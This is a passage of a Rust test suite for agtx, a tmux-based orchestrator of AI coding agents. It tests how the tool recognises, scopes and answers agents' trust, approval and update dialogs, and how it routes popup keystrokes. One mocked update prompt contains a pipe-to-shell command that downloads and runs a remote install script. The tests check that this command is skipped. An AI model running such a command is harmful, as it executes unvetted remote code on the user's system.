        "session dialogs must not be matched against any pane"
    );
}

/// Codex's mid-session MCP approval, answered from the spec table.
#[test]
#[cfg(feature = "test-mocks")]
fn test_answer_session_dialogs_handles_codex_mcp_approval() {
    let pane = "Allow the agtx MCP server to run tool get_task?\n  1. Yes  2. No  3. Always allow";

    let mut mock = MockTmuxOperations::new();
    let mut seq = mockall::Sequence::new();
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "3")
        .returning(|_, _| Ok(()));
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    answer_session_dialogs(&ops, "t:1", "codex", pane);
}

/// The same pane under a different agent must be left alone — session dialogs
/// are matched only against the agent that owns them.
#[test]
#[cfg(feature = "test-mocks")]
fn test_answer_session_dialogs_is_scoped_to_its_own_agent() {
    let pane = "Allow the agtx MCP server to run tool get_task?\n  3. Always allow";
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().never();
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    answer_session_dialogs(&ops, "t:1", "claude", pane);
    answer_session_dialogs(&ops, "t:1", "mistral", pane);
}

/// All three patterns are required for the codex prompt: none is distinctive
/// enough alone, and a partial match would type a stray "3" into the composer.
#[test]
#[cfg(feature = "test-mocks")]
fn test_answer_session_dialogs_requires_every_pattern() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().never();
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    answer_session_dialogs(&ops, "t:1", "codex", "Allow the tool to run? Always allow");
}

// =============================================================================
// Per-agent attribution of indicators and launch dialogs (open question 1)
// =============================================================================

/// Another agent's readiness string in this agent's pane does not count.
/// "Ask anything" is OpenCode's, and a Claude pane showing it — in conversation
/// output, say — must not read as an agent being up.
#[test]
#[cfg(feature = "test-mocks")]
fn test_active_indicators_are_scoped_to_their_agent() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .returning(|_| Some("zsh".to_string()));
    mock.expect_capture_pane()
        .returning(|_| Ok("some output mentioning Ask anything\n".to_string()));

    // OpenCode's own indicator still counts in an OpenCode pane.
    assert!(is_agent_active(&mock, "proj:task", Some("opencode")));
    // In a Claude pane it does not.
    assert!(!is_agent_active(&mock, "proj:task", Some("claude")));
    // An agent agtx has no spec for keeps the historical flat match, so such a
    // pane is not left undetectable.
    assert!(is_agent_active(&mock, "proj:task", None));
}

/// Answering a dialog sends a menu digit. Doing that in the wrong agent's pane
/// types a stray "1" into a live composer, so a dialog is only answered for the
/// agent that owns it.
#[test]
#[cfg(feature = "test-mocks")]
fn test_launch_dialogs_are_scoped_to_their_agent() {
    let gemini_pane = "Do you trust the files in this folder?\n  1. Yes  2. No";

    // In a Claude pane, Gemini's dialog is ignored.
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().never();
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(!dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("claude"),
        gemini_pane,
        &mut LaunchDialogState::default(),
        true,
    ));

    // In a Gemini pane it is answered.
    let mut mock2 = MockTmuxOperations::new();
    mock2.expect_send_key().times(2).returning(|_, _| Ok(()));
    let ops2: Arc<dyn TmuxOperations> = Arc::new(mock2);
    assert!(dismiss_launch_dialog(
        &ops2,
        "t:1",
        Some("gemini"),
        gemini_pane,
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// An unknown agent keeps the flat behaviour: better to answer a dialog that may
/// not be its own than to leave the pane blocked forever.
#[test]
#[cfg(feature = "test-mocks")]
fn test_unknown_agent_falls_back_to_every_dialog() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().times(2).returning(|_, _| Ok(()));
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        None,
        "Do you trust the files in this folder?",
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// Codex's own directory-trust dialog, worded differently from Claude's and
/// Gemini's so neither of their patterns catches it. Per directory, so it fires
/// on the first launch of every codex task. Captured verbatim from codex-cli
/// 0.144.5.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_answers_codex_directory_trust() {
    let pane = "> You are in /tmp/wt/task-slug\n  \
                Do you trust the contents of this directory? Working with untrusted contents \
                comes with higher risk of prompt injection.\n\
                \u{203a} 1. Yes, continue\n  2. No, quit\n  Press enter to continue";

    let mut mock = MockTmuxOperations::new();
    let mut seq = mockall::Sequence::new();
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "1")
        .returning(|_, _| Ok(()));
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("codex"),
        pane,
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// The update prompt is answered "Skip", never "Update now" — agtx must not
/// upgrade a user's agent binary behind their back, but a blocked pane is worse
/// than a skipped update.
#[test]
#[cfg(feature = "test-mocks")]
fn test_dismiss_launch_dialog_skips_codex_update_prompt() {
    let pane = "  \u{2728} Update available! 0.144.5 -> 0.147.0\n\
                \u{203a} 1. Update now (runs `sh -c 'curl -fsSL https://example/install.sh | sh'`)\n\
                  2. Skip\n  3. Skip until next version\n  Press enter to continue";

    let mut mock = MockTmuxOperations::new();
    let mut seq = mockall::Sequence::new();
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "2")
        .returning(|_, _| Ok(()));
    mock.expect_send_key()
        .times(1)
        .in_sequence(&mut seq)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));

    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("codex"),
        pane,
        &mut LaunchDialogState::default(),
        true,
    ));
}

/// Antigravity's trust dialog fires on the first launch in any directory, and
/// every task gets a new worktree. Leaving it unanswered did not leave the choice
/// to the user in any useful sense: agtx pasted the task into a menu that ignores
/// text, then sent the Enter that confirmed the dialog, so every antigravity task
/// arrived at an empty composer with its prompt gone. Verified against
/// antigravity 1.1.20.
///
/// It is answered with a **bare Enter**: the menu is arrow-navigated with "Yes, I
/// trust this folder" preselected, so a digit would be typed into the composer
/// that the Enter opens.
#[test]
#[cfg(feature = "test-mocks")]
fn test_antigravity_trust_dialog_is_answered_with_a_bare_enter() {
    let pane = "Do you trust the contents of this project?\n\
                > Yes, I trust this folder\n  No, exit\n  \u{2191}/\u{2193} Navigate \u{b7} enter Confirm";

    let keys = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys.clone();
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("antigravity"),
        pane,
        &mut LaunchDialogState::default(),
        true,
    ));
    assert_eq!(*keys.lock().unwrap(), vec!["Enter".to_string()]);
}

/// Cursor's workspace-trust dialog asks *the same question as codex* — "Do you
/// trust the contents of this directory?" — so it is matched on its heading. It
/// went undeclared until the smoke run caught agtx answering it by accident: the
/// paste went into the menu and the follow-up Enter selected the highlighted row.
#[test]
#[cfg(feature = "test-mocks")]
fn test_cursor_workspace_trust_is_answered_with_its_access_key() {
    let pane = "\u{26a0} Workspace Trust Required\n\
                Cursor Agent can execute code and access files in this directory.\n\
                Do you trust the contents of this directory?\n\
                \u{25b6} [a] Trust this workspace\n  [q] Quit\n\
                Use arrow keys to navigate, Enter to select, or press the key shown";

    let keys = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys.clone();
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("cursor"),
        pane,
        &mut LaunchDialogState::default(),
        true,
    ));
    assert_eq!(*keys.lock().unwrap(), vec!["a".to_string()]);
}

/// ...and the shared question line must not make codex's entry fire in a cursor
/// pane, or vice versa: codex's answer is "1", which in cursor's dialog is not
/// an option at all.
#[test]
#[cfg(feature = "test-mocks")]
fn test_cursor_and_codex_trust_dialogs_do_not_cross_fire() {
    let cursor_pane =
        "\u{26a0} Workspace Trust Required\nDo you trust the contents of this directory?";
    // Codex's entry matches the shared question line — and its answer is "1",
    // which is not an option in cursor's menu at all. Scoping is what keeps it
    // from firing here, so this must be asserted against *codex*, not against an
    // agent that declares no matching dialog (which would pass vacuously).
    let codex_keys = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let codex_keys_c = codex_keys.clone();
    let mut cursor_mock = MockTmuxOperations::new();
    cursor_mock.expect_send_key().returning(move |_, k| {
        codex_keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    let cursor_ops: Arc<dyn TmuxOperations> = Arc::new(cursor_mock);
    assert!(dismiss_launch_dialog(
        &cursor_ops,
        "t:1",
        Some("cursor"),
        cursor_pane,
        &mut LaunchDialogState::default(),
        true,
    ));
    assert_eq!(
        *codex_keys.lock().unwrap(),
        vec!["a".to_string()],
        "cursor's own answer, never codex's digit"
    );

    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().never();
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    // ...and cursor's heading is absent from codex's own dialog.
    let codex_pane = "Do you trust the contents of this directory?\n  1. Yes\n  2. No";
    let keys = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys.clone();
    let mut mock2 = MockTmuxOperations::new();
    mock2.expect_send_key().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    let ops2: Arc<dyn TmuxOperations> = Arc::new(mock2);
    assert!(
        dismiss_launch_dialog(
            &ops2,
            "t:1",
            Some("cursor"),
            codex_pane,
            &mut LaunchDialogState::default(),
            true,
        ) == false
    );
}

/// The reverse of the scoping guard: antigravity's own wording must not be
/// answered in someone else's pane. Codex's differs by a single word
/// ("directory" vs "project"), so a sloppy pattern would cross-fire.
#[test]
#[cfg(feature = "test-mocks")]
fn test_antigravity_trust_dialog_is_scoped_to_antigravity() {
    let pane = "Do you trust the contents of this project?\n> Yes, I trust this folder";
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().never();
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    assert!(!dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("codex"),
        pane,
        &mut LaunchDialogState::default(),
        true,
    ));
}

// ===========================================================================
// auto_trust: agtx stops answering security prompts
// ===========================================================================

/// With `auto_trust` off, a trust prompt is recognised but **not** answered.
///
/// The distinction is the whole design: detection is what turns the card
/// `Blocked`; answering is the security decision agtx hands back to the user.
#[test]
#[cfg(feature = "test-mocks")]
fn test_security_dialogs_are_not_answered_when_auto_trust_is_off() {
    let mut mock = MockTmuxOperations::new();
    // No keystroke may reach the pane: asserting on the mock is the point.
    mock.expect_send_key().times(0);
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    let pane = "❯ 1. Yes, I trust this folder\n  2. No, exit";
    let mut st = LaunchDialogState::default();
    assert!(!dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("claude"),
        pane,
        &mut st,
        false
    ));
    assert!(visible_security_dialog(Some("claude"), pane).is_some());
}

/// A prompt that decides nothing about safety is still answered — leaving it up
/// only wedges the pane, and agtx picks "Skip" either way.
#[test]
#[cfg(feature = "test-mocks")]
fn test_non_security_dialogs_are_still_answered_when_auto_trust_is_off() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_send_key().returning(|_, _| Ok(()));
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    let pane = "✨ Update available!\n› 1. Update now (runs `sh -c ...`)\n  2. Skip";
    let mut st = LaunchDialogState::default();
    assert!(dismiss_launch_dialog(
        &ops,
        "t:1",
        Some("codex"),
        pane,
        &mut st,
        false
    ));
    assert!(visible_security_dialog(Some("codex"), pane).is_none());
}

/// Every trust and permission-bypass prompt must be classified as a security
/// decision, and the two nuisance prompts must not be. Getting this backwards
/// either hands the user a prompt agtx should just skip, or answers a security
/// question on their behalf.
#[test]
fn test_dialog_security_classification() {
    let secure: &[(&str, &str)] = &[
        ("claude", "Yes, I trust this folder"),
        ("claude", "Yes, I accept"),
        ("codex", "Do you trust the contents of this directory?"),
        ("gemini", "Do you trust the files in this folder?"),
        ("cursor", "Workspace Trust Required"),
        ("antigravity", "Do you trust the contents of this project?"),
    ];
    for (agent, pattern) in secure {
        let d = agent::spec(agent)
            .unwrap()
            .dialogs
            .iter()
            .find(|d| d.patterns.contains(pattern))
            .unwrap_or_else(|| panic!("{agent}: no dialog matching {pattern}"));
        assert!(d.security, "{agent}: {pattern} must be a security decision");
    }
    for (agent, pattern) in [("codex", "Update now (runs"), ("codex", "Allow the")] {
        let d = agent::spec(agent)
            .unwrap()
            .dialogs
            .iter()
            .find(|d| d.patterns.contains(&pattern))
            .unwrap();
        assert!(
            !d.security,
            "{agent}: {pattern} decides nothing about safety"
        );
    }
}

/// A pane showing a trust prompt outranks every liveness signal: the agent is
/// idle by any measure, but it is waiting on a person.
#[test]
#[cfg(feature = "test-mocks")]
fn test_awaiting_trust_forces_blocked_over_working() {
    let mut app = make_test_app();
    let result = SessionRefreshResult {
        statuses: vec![SessionTaskStatus {
            task_id: "t1".to_string(),
            phase_status: PhaseStatus::Working,
            content_hash: Some(7),
            hook_status: None,
            awaiting_trust: Some("Yes, I trust this folder".to_string()),
            status: TaskStatus::Planning,
            worktree_path: None,
            session_name: None,
            agent: "claude".to_string(),
            was_ready: false,
        }],
    };
    app.apply_session_refresh(result);
    assert_eq!(
        app.state.phase_status_cache.get("t1").map(|(p, _)| *p),
        Some(PhaseStatus::Blocked)
    );
    // The reason names the agent and the way out, because agtx cannot fix it.
    let reason = app
        .state
        .blocked_reasons
        .get("t1")
        .expect("reason recorded");
    assert!(reason.contains("claude"), "{reason}");
    assert!(reason.contains("project root"), "{reason}");
    // And it is tracked separately, so the orchestrator leaves it alone.
    assert!(app.state.trust_blocked.contains("t1"));
}

/// Once the user answers, the flag clears and the task resumes its normal
/// status — no stale `Blocked` badge left behind.
#[test]
#[cfg(feature = "test-mocks")]
fn test_trust_block_clears_once_the_dialog_is_gone() {
    let mut app = make_test_app();
    let blocked = |awaiting: Option<String>| SessionRefreshResult {
        statuses: vec![SessionTaskStatus {
            task_id: "t1".to_string(),
            phase_status: PhaseStatus::Working,
            content_hash: Some(7),
            hook_status: None,
            awaiting_trust: awaiting,
            status: TaskStatus::Planning,
            worktree_path: None,
            session_name: None,
            agent: "claude".to_string(),
            was_ready: false,
        }],
    };
    app.apply_session_refresh(blocked(Some("Yes, I trust this folder".to_string())));
    assert!(app.state.trust_blocked.contains("t1"));
    app.apply_session_refresh(blocked(None));
    assert!(!app.state.trust_blocked.contains("t1"));
    assert!(app.state.blocked_reasons.get("t1").is_none());
}

// ===========================================================================
// submit_message — the Enter that submits is its own delivery problem
// ===========================================================================

/// A dropped Enter is retried while the message is still in the composer, and
/// the retries are bounded — an agent that never submits must cost a fixed
/// number of keypresses, not an unbounded stream into its composer.
#[test]
#[cfg(feature = "test-mocks")]
fn test_submit_message_retries_while_the_composer_still_holds_it() {
    let mut mock = MockTmuxOperations::new();
    // Same frame every time: nothing ever submits.
    mock.expect_capture_pane()
        .returning(|_| Ok("* /agtx:execute abc".to_string()));
    mock.expect_send_key()
        .times(SUBMIT_ATTEMPTS as usize)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    submit_message(&ops, "t:1", "/agtx:execute abc");
}

/// One Enter is enough when the composer clears — a second would fire into an
/// already-empty composer.
#[test]
#[cfg(feature = "test-mocks")]
fn test_submit_message_stops_once_the_composer_clears() {
    let mut mock = MockTmuxOperations::new();
    let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let c = std::sync::Arc::clone(&calls);
    mock.expect_capture_pane().returning(move |_| {
        // First read is the pre-Enter baseline; everything after shows a
        // submitted, cleared composer.
        let n = c.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        Ok(if n == 0 {
            "* /agtx:execute abc".to_string()
        } else {
            "✦ Working…".to_string()
        })
    });
    mock.expect_send_key()
        .times(1)
        .withf(|_, k| k == "Enter")
        .returning(|_, _| Ok(()));
    let ops: Arc<dyn TmuxOperations> = Arc::new(mock);
    submit_message(&ops, "t:1", "/agtx:execute abc");
}

// === Update notice ===

#[cfg(feature = "test-mocks")]
fn an_update() -> crate::update::UpdateInfo {
    crate::update::UpdateInfo {
        current: crate::update::Version::parse("0.2.7").unwrap(),
        latest: crate::update::Version::parse("0.2.8").unwrap(),
        tag: "v0.2.8".to_string(),
        html_url: "https://github.com/fynnfluegge/agtx/releases/tag/v0.2.8".to_string(),
    }
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_u_does_nothing_without_an_available_update() {
    // `u` is only a binding when there is something to install. Without the
    // guard it would swallow a keystroke the board may want later.
    let mut app = make_test_app();
    assert!(app.state.update_available.is_none());
    press_key(&mut app, KeyCode::Char('u'));
    assert!(app.state.update_popup.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_u_opens_the_update_popup() {
    let mut app = make_test_app();
    app.state.update_available = Some(an_update());
    press_key(&mut app, KeyCode::Char('u'));

    let popup = app.state.update_popup.as_ref().expect("popup should open");
    assert_eq!(popup.info.tag, "v0.2.8");
    assert!(!popup.installing);
    assert!(popup.status.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_esc_closes_the_update_popup() {
    let mut app = make_test_app();
    app.state.update_available = Some(an_update());
    press_key(&mut app, KeyCode::Char('u'));
    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.update_popup.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_keys_are_ignored_while_the_install_is_in_flight() {
    // A second Enter would start a competing download into the same staging
    // directory, and Esc would leave a thread writing into the binary the user
    // just walked away from.
    let mut app = make_test_app();
    app.state.update_available = Some(an_update());
    press_key(&mut app, KeyCode::Char('u'));
    app.state.update_popup.as_mut().unwrap().installing = true;

    press_key(&mut app, KeyCode::Esc);
    assert!(
        app.state.update_popup.is_some(),
        "Esc must not close mid-install"
    );
    press_key(&mut app, KeyCode::Enter);
    assert!(app.state.update_install_rx.is_none(), "no second download");
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_enter_closes_a_finished_popup_rather_than_reinstalling() {
    let mut app = make_test_app();
    app.state.update_available = Some(an_update());
    press_key(&mut app, KeyCode::Char('u'));
    app.state.update_popup.as_mut().unwrap().status =
        Some("agtx 0.2.8 installed — restart agtx to apply".to_string());

    press_key(&mut app, KeyCode::Enter);
    assert!(app.state.update_popup.is_none());
    assert!(app.state.update_install_rx.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_board_and_popup_draw_with_an_update_available() {
    // The header notice adds a multi-byte span ("⬆") to the right-aligned
    // group, whose padding is computed from the span widths.
    let mut app = make_test_app();
    app.state.update_available = Some(an_update());
    assert!(app.draw().is_ok());

    press_key(&mut app, KeyCode::Char('u'));
    assert!(app.draw().is_ok());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_dashboard_draws_with_an_update_available() {
    let mut app = App::new_for_test(
        None,
        Arc::new(MockTmuxOperations::new()),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    app.state.update_available = Some(an_update());
    assert!(app.draw().is_ok());

    press_key(&mut app, KeyCode::Char('u'));
    assert!(app.state.update_popup.is_some());
    assert!(app.draw().is_ok());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_no_release_check_runs_in_tests() {
    // `new_for_test` must never spawn the network thread — the suite runs
    // offline and in CI, and a check per constructed App would be both slow and
    // a live dependency on GitHub.
    let app = make_test_app();
    assert!(app.state.update_rx.is_none());
}

// =============================================================================
// Popup input: what a keystroke becomes, and where it goes
// =============================================================================

/// Helper: an App whose pane input is recorded instead of sent.
#[cfg(feature = "test-mocks")]
fn app_with_recording_sink() -> (App, Arc<crate::tmux::RecordingSink>) {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);
    mock_tmux.expect_pane_metrics().returning(|_| None);
    mock_tmux.expect_resize_window().returning(|_, _, _| Ok(()));
    // Nothing on the key path may reach tmux directly any more.
    mock_tmux.expect_send_key().times(0);
    mock_tmux.expect_send_text().times(0);
    mock_tmux.expect_paste_text().times(0);

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    let sink = Arc::new(crate::tmux::RecordingSink::new());
    app.set_input_sink(Arc::clone(&sink) as Arc<dyn crate::tmux::PaneInputSink>);
    (app, sink)
}

#[cfg(feature = "test-mocks")]
fn key_event(code: KeyCode, modifiers: KeyModifiers) -> crossterm::event::KeyEvent {
    crossterm::event::KeyEvent::new(code, modifiers)
}

/// Helper: an App with a popup open on `proj:task`, plus its recording sink.
#[cfg(feature = "test-mocks")]
fn app_with_open_popup() -> (App, Arc<crate::tmux::RecordingSink>) {
    let (mut app, sink) = app_with_recording_sink();
    app.state.shell_popup = Some(ShellPopup::new(
        "my task".to_string(),
        "proj:task".to_string(),
    ));
    (app, sink)
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_printable_key_is_enqueued_as_literal_text() {
    let (mut app, sink) = app_with_open_popup();
    for c in "aZ 9".chars() {
        app.handle_key(key_event(KeyCode::Char(c), KeyModifiers::NONE))
            .unwrap();
    }
    assert_eq!(
        sink.taken(),
        "aZ 9"
            .chars()
            .map(|c| PaneInput::Text {
                target: "proj:task".to_string(),
                text: c.to_string(),
            })
            .collect::<Vec<_>>()
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_character_that_tmux_would_read_as_syntax_is_still_text() {
    // Through tmux's key-name lookup a standalone `;` is a command separator and
    // the keystroke never reaches the pane. As text it is just a semicolon.
    let (mut app, sink) = app_with_open_popup();
    for c in [';', '$', '#', '"', '\\'] {
        app.handle_key(key_event(KeyCode::Char(c), KeyModifiers::NONE))
            .unwrap();
    }
    assert!(
        sink.taken()
            .iter()
            .all(|input| matches!(input, PaneInput::Text { .. })),
        "punctuation must never go through key-name lookup"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn shifted_characters_carry_no_modifier_prefix() {
    // crossterm reports the shifted character itself, so `M-A`/`S-a` would both
    // be wrong: the character is the whole story.
    let (mut app, sink) = app_with_open_popup();
    app.handle_key(key_event(KeyCode::Char('A'), KeyModifiers::SHIFT))
        .unwrap();
    assert_eq!(
        sink.taken(),
        vec![PaneInput::Text {
            target: "proj:task".to_string(),
            text: "A".to_string(),
        }]
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn named_keys_are_enqueued_as_key_names() {
    let (mut app, sink) = app_with_open_popup();
    for code in [
        KeyCode::Enter,
        KeyCode::Esc,
        KeyCode::Up,
        KeyCode::Down,
        KeyCode::Left,
        KeyCode::Right,
        KeyCode::Backspace,
        KeyCode::Tab,
        KeyCode::Delete,
        KeyCode::F(5),
    ] {
        app.handle_key(key_event(code, KeyModifiers::NONE)).unwrap();
    }
    let keys: Vec<String> = sink
        .taken()
        .into_iter()
        .map(|input| match input {
            PaneInput::Key { key, .. } => key,
            other => panic!("expected a key, got {other:?}"),
        })
        .collect();
    assert_eq!(
        keys,
        vec!["Enter", "Escape", "Up", "Down", "Left", "Right", "BSpace", "Tab", "DC", "F5"]
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn modified_characters_are_key_names_not_text() {
    // Ctrl+a is a key; sending it as literal text would type an "a".
    let (mut app, sink) = app_with_open_popup();
    app.handle_key(key_event(KeyCode::Char('a'), KeyModifiers::CONTROL))
        .unwrap();
    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::ALT))
        .unwrap();
    assert_eq!(
        sink.taken(),
        vec![
            PaneInput::Key {
                target: "proj:task".to_string(),
                key: "C-a".to_string(),
            },
            PaneInput::Key {
                target: "proj:task".to_string(),
                key: "M-b".to_string(),
            },
        ]
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn the_popups_own_shortcuts_are_never_forwarded() {
    // Ctrl+q closes, Ctrl+f toggles fullscreen, and Ctrl+u/d/g navigate. None of
    // them belong to the agent, and forwarding one would be invisible damage.
    let (mut app, sink) = app_with_open_popup();
    for code in ['u', 'd', 'g', 'f'] {
        app.handle_key(key_event(KeyCode::Char(code), KeyModifiers::CONTROL))
            .unwrap();
    }
    assert!(
        sink.taken()
            .iter()
            .all(|input| matches!(input, PaneInput::Barrier { .. })),
        "popup-local shortcuts must enqueue nothing but the fullscreen barrier"
    );
    assert!(app.state.shell_popup.is_some());

    app.handle_key(key_event(KeyCode::Char('q'), KeyModifiers::CONTROL))
        .unwrap();
    assert!(app.state.shell_popup.is_none(), "Ctrl+q closes the popup");
}

#[test]
#[cfg(feature = "test-mocks")]
fn ctrl_j_and_k_are_not_popup_keymaps() {
    let (mut app, sink) = app_with_open_popup();
    for code in ['j', 'k'] {
        app.handle_key(key_event(KeyCode::Char(code), KeyModifiers::CONTROL))
            .unwrap();
    }
    assert_eq!(
        sink.taken(),
        vec![
            PaneInput::Key {
                target: "proj:task".to_string(),
                key: "C-j".to_string(),
            },
            PaneInput::Key {
                target: "proj:task".to_string(),
                key: "C-k".to_string(),
            },
        ],
        "unmapped chords should pass through without agtx translating them"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn closing_the_popup_waits_for_the_target_it_was_typed_into() {
    // Batched characters belong to the pane they were typed into, and agtx's own
    // next write to that pane — a phase advance is one keystroke away on the
    // board — must not overtake them. An *enqueued* flush returns before
    // delivery, so this has to be the acknowledged one.
    let (mut app, sink) = app_with_open_popup();
    app.handle_key(key_event(KeyCode::Char('h'), KeyModifiers::NONE))
        .unwrap();
    app.handle_key(key_event(KeyCode::Char('q'), KeyModifiers::CONTROL))
        .unwrap();
    assert!(
        matches!(sink.taken().last(), Some(PaneInput::Barrier { .. })),
        "closing the popup must wait for the queued prefix, not just enqueue a flush"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn toggling_fullscreen_waits_before_resizing_the_pane() {
    // The resize is a synchronous tmux subprocess on a different socket. If the
    // flush were only enqueued it could still be pending when the resize lands,
    // and the text would reach the pane at the wrong size.
    let (mut app, sink) = app_with_open_popup();
    app.handle_key(key_event(KeyCode::Char('x'), KeyModifiers::NONE))
        .unwrap();
    app.handle_key(key_event(KeyCode::Char('f'), KeyModifiers::CONTROL))
        .unwrap();
    let sent = sink.taken();
    assert!(
        matches!(sent.last(), Some(PaneInput::Barrier { .. })),
        "Ctrl+F must wait for the queued prefix before it resizes, got {sent:?}"
    );
}

/// Give the popup a pane that reports `history_size` lines of scrollback.
#[cfg(feature = "test-mocks")]
fn with_scrollback(app: &mut App, history_size: usize) {
    if let Some(popup) = app.state.shell_popup.as_mut() {
        popup.metrics = Some(crate::tmux::PaneMetrics {
            cursor_x: 0,
            cursor_y: 1,
            pane_height: 20,
            history_size,
        });
        popup.cached_content = (0..200)
            .map(|i| format!("line {i}\n"))
            .collect::<String>()
            .into_bytes();
    }
}

#[test]
#[cfg(feature = "test-mocks")]
fn scroll_keys_move_the_popup_when_tmux_has_history() {
    let (mut app, sink) = app_with_open_popup();
    with_scrollback(&mut app, 500);
    for code in [KeyCode::Char('p'), KeyCode::Char('u')] {
        app.handle_key(key_event(code, KeyModifiers::CONTROL))
            .unwrap();
    }
    app.handle_key(key_event(KeyCode::PageUp, KeyModifiers::NONE))
        .unwrap();
    assert_eq!(
        app.state.shell_popup.as_ref().unwrap().scroll_offset,
        -45,
        "5 + 20 + 20 lines of agtx-side scrolling"
    );
    assert!(
        sink.taken().is_empty(),
        "with real scrollback the agent must not see the scroll keys"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn hidden_ctrl_arrow_scroll_aliases_are_preserved() {
    let (mut app, sink) = app_with_open_popup();
    with_scrollback(&mut app, 500);
    app.handle_key(key_event(KeyCode::Up, KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.shell_popup.as_ref().unwrap().scroll_offset, -5);
    app.handle_key(key_event(KeyCode::Down, KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.shell_popup.as_ref().unwrap().scroll_offset, 0);
    assert!(sink.taken().is_empty());
}

#[test]
#[cfg(feature = "test-mocks")]
fn scroll_keys_go_to_the_agent_when_tmux_has_no_history() {
    // A pane in the alternate screen keeps no tmux scrollback, so agtx's buffer
    // is one screen and scrolling it moves nothing. The agent owns the history,
    // so it gets the key it scrolls with.
    let (mut app, sink) = app_with_open_popup();
    with_scrollback(&mut app, 0);
    for code in [
        KeyCode::Char('p'),
        KeyCode::Char('n'),
        KeyCode::Char('u'),
        KeyCode::Char('d'),
    ] {
        app.handle_key(key_event(code, KeyModifiers::CONTROL))
            .unwrap();
    }
